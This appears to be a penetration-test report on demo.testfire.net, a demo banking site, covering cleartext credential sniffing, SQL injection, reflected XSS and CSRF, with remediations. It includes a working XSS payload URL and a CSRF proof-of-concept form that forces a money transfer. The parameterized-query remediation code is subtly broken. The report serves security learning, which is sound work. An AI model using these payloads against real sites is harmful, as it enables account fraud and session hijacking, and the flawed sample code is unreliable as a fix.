# Security Testing:
## Url: <http://demo.testfire.net/>




## Test Statement:
The web application  is running into the http server where the ssl is not active. For the reason the post   request should be go with simple text format into the server.  

<img width="411" alt="image" src="https://user-images.githubusercontent.com/65080702/178159826-ac5e28f4-109d-4e60-b97d-26341a4d93da.png">



|**Tools used:**|Wireshark |
| :- | :- |
|<p>**Risk Rating:**  </p><p></p>|<p>**HIGH** </p><p></p>|
|<p>**Attack Type:**</p><p></p>|<p>**Brute force** </p><p></p>|

## **Testing  method:** 
![](Aspose.Words.d33b99ae-7948-4cb5-8bde-6419b985d85d.001.png)            

Though Tool of Wireshark, we just get the network packet into the website and  received packet send the response simple text format so , we got the username and password which is client using for get into the website. 


## Remediation:
* Add new  SSL Certification with advanced Cryptography

## Test Statement:
The web application is using java servlet server response. The web-application running into http server but the application is reflected DOM  

|**Tools used:**|NA|
| :- | :- |
|<p>**Risk Rating:**  </p><p></p>|<p>**HIGH** </p><p></p>|
|<p>**Attack Type:**</p><p></p>|<p>**REFLECTED_XSS**</p><p></p>|

## **Testing  method:** 
When add the script into url the hole things is reflected . so, lots of phishing  attack has to be demonstrate though it. 

`http://demo.testfire.net/search.jsp?query=<script>alert(document.lastModified);</script>`
            
            
 <img width="566" alt="image" src="https://user-images.githubusercontent.com/65080702/177851893-26e6e67b-9b66-42b2-84e1-62c52b91d040.png">

##
## Remediation:
Remove all the special character uses in html entries. The key html entities to identify

are:

* \> (greater than)

* < (less than)

* & (ampersand)

* ' (apostrophe or single quote)

* " (double quote)

## Test Statement:

<img width="556" alt="image" src="https://user-images.githubusercontent.com/65080702/178159538-7f550794-9e6a-4203-aa7f-56fa43c7fee5.png">


Mainly I given the sql payload into the login pages where I can check that used DBMS is vulnerable or not 

|**Tools used:**|Brup-suit|
| :- | :- |
|<p>**Risk Rating:**  </p><p></p>|<p>**HIGH** </p><p></p>|
|<p>**Attack Type:**</p><p></p>|<p>**Sql_Injection**</p><p></p>|

## **Testing  method:** 
Connect the forward proxy with  the burp-suit into the search then try to test the post request is working using the payload 

<img width="677" alt="image" src="https://user-images.githubusercontent.com/65080702/178157910-1e4df78d-07ce-4fbf-a9c0-29a71483b71d.png">

## Respose: 

<img width="641" alt="image" src="https://user-images.githubusercontent.com/65080702/178157967-f6d74d84-8e86-4888-a821-3d913df730be.png">

## Remedataion

* Use parameterized query

```
String login = request.getParameter("UserName","Password");
String query = "SELECT login FROM user_data WHERE user_name = ? ";  
PreparedStatement pstmt = connection.prepareStatement( query );
pstmt.setString( 1, user_data);
ResultSet results = pstmt.executeQuery( );
```

## Test Statement:
We try to intercept the request and try to some illegal activity. Following step below:

![image](https://user-images.githubusercontent.com/65080702/178192032-844a173c-2cca-4171-9b5c-6d2179ab32e7.png)

|**Tools used:**|Brup-suit|
| :- | :- |
|<p>**Risk Rating:**  </p><p></p>|<p>**HIGH** </p><p></p>|
|<p>**Attack Type:**</p><p></p>|<p>**CSRF**</p><p></p>|

## Test Statement:

* intecept the request from burpsuite 

![image](https://user-images.githubusercontent.com/65080702/178192315-0c8de973-366b-4194-9f37-5145f876cd9a.png)

* response got from the tool with manupulation:

![image](https://user-images.githubusercontent.com/65080702/178192454-99ac7508-29eb-48b1-930b-dcc6871de743.png)

## POC:
```
<html>
	<body>
		<form method="POST" action="http://demo.testfire.net/bank/doTransfer">
			<input type="hidden" name="fromAccount" value="800001"/>
			<input type="hidden" name="toAccount" value="800000"/>
			<input type="hidden" name="transferAmount" value="25000"/>
			<input type="hidden" name="transfer" value="Transfer+Money"/>
			<input type="submit" value="Submit">
		</form>
	</body>
<html>
```

## Response:

we got a postive respose into the website which is a threat of the user: 

![image](https://user-images.githubusercontent.com/65080702/178192848-0a6605b6-f9d8-43c3-beda-2ab5cf5dc62d.png)

## Remediation:

* provide the session id with time expire limit.
* Use uniqe session id for every time login.
* The application compares the token generated and stored by the application with the token sent in the request
* If these tokens match, the request is valid
* If these tokens do not match, the request is invalid and is rejected


